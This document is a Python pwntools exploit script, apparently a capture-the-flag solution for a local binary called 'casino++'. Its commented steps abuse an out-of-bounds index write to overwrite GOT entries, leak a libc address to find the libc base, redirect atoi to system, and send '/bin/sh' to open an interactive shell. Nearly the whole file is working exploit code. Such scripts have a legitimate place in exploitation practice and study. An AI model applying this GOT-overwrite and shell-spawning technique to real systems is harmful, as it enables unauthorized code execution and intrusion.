from pwn import *

#use to send wrong answer so that it would not call puts
def wrongAns(p):
    for i in range(6):
        p.sendlineafter(': ', str(0))
#use to send correct answer so that it would call puts
def correctAns(p, guess):
    for i in range(6):
        p.sendlineafter(': ', str(guess[i]))
#use to change index's content to num
def modNum(p, index, num):
    p.sendlineafter('[1:yes 0:no]: ', '1')
    p.sendlineafter('[1 ~ 6]: ', str(index))
    p.sendlineafter(': ', str(num))

p = process('./casino++')
elf = ELF('./casino++')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

name = b'a' * 16
seed = b'\x00' * 4
age = b'a'*4
printfPLT = elf.plt['printf']
startGOT = elf.got['__libc_start_main']
casino = elf.symbols['casino']
main = elf.symbols['main']
payload = name + p64(startGOT) + age       #put GOT of __libc_start_main as seed
p.recvuntil('name:')
p.sendline(payload)

# set age over 20 to enter casino function
p.recvuntil('age:')
p.sendline('22')

# first time just input six incorrect number so that it will not call "puts("You win! Hacker don't need luck :P")"
wrongAns(p)
#change puts's GOT high 4 byte to 0
modNum(p, -42, 0)
# enter six correct number so it will call puts which has been hijack to shellcode address
guess = [61, 68, 32, 22, 69, 20]
correctAns(p, guess)
#change puts low 4 byte to casino so it will go back to casino
modNum(p, -43, casino)

#back to casino
wrongAns(p)
modNum(p, -34, 0)
correctAns(p, guess)
modNum(p, -35, printfPLT)   #set sand(seed) to printf(seed) -> printf(startGOT) 
base = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['__libc_start_main']  #leak address of __libc_start_main
print('libc base address = ', hex(base))
system = base + libc.symbols['system'] 
print('system address = ', hex(system))

# back to casino again
wrongAns(p)
offset = system & 0xffffffff
modNum(p, -29, offset)  # change atoi(buf) to system(buf) because the high 8 byte is same so we just need to change the low 8 byte
p.recv()
p.sendline('/bin/sh\x00') # read to buf and pass to atoi which has been hijack to system

p.interactive()